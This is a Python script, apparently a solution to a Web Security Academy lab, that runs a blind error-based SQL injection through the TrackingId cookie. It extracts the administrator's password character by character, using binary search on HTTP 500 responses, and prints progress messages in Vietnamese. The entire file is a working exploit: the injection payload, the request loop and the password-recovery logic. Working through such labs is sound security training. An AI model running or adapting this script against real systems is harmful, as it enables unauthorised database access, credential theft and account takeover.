#!/usr/bin/python3

import requests

passwd = ''
chars = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'
URL = 'https://0af300e103bbc65d804a03f100bc00bb.web-security-academy.net/'
for i in range(1,21):
	low = 0
	high = len(chars) - 1
	print("Vị trí: ", i)
	while low < high:
		mid = low + int((high-low)/2)
		# print(mid)
		Inject = "5H1pjPa8IYirkDFf' AND (SELECT CASE WHEN (SUBSTR(password, {index}, 1) > '{character}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a".format(index=i, character=chars[mid])
		cookie = {'session':'PjF9HChyvz4vXxGgKvnnMm33JYCIdxKp', 'TrackingId':Inject}
		print("Khoảng : ", chars[mid] ,"-",chars[high], " ___ ", chars[low], end='\r')
		r = requests.get(URL, cookies=cookie)
		if r.status_code == 500:
			if high - mid == 1:
				passwd += chars[high]
				break
			low = mid + 1
		else:
			Inject = "5H1pjPa8IYirkDFf' AND (SELECT CASE WHEN (SUBSTR(password, {index}, 1) = '{character}') THEN TO_CHAR(1/0) ELSE 'a' END FROM users WHERE username='administrator') = 'a".format(index=i, character=chars[mid])
			cookie = {'session':'PjF9HChyvz4vXxGgKvnnMm33JYCIdxKp', 'TrackingId':Inject}
			r = requests.get(URL, cookies=cookie)
			# print("Ký tự : ", chars[mid])
			if r.status_code == 500:
				passwd += chars[mid]
				break
			if high - low == 2:
				# print("Ký tự : ", chars[low] , "-", chars[high])
				passwd += chars[low]
				break
			high = mid - 1
	# with open('PASS.txt', 'a') as f:
	# 	f.write(passwd)	
	# 	f.write('\n')
	print('\n')
	print("PASSWORD : ", passwd)
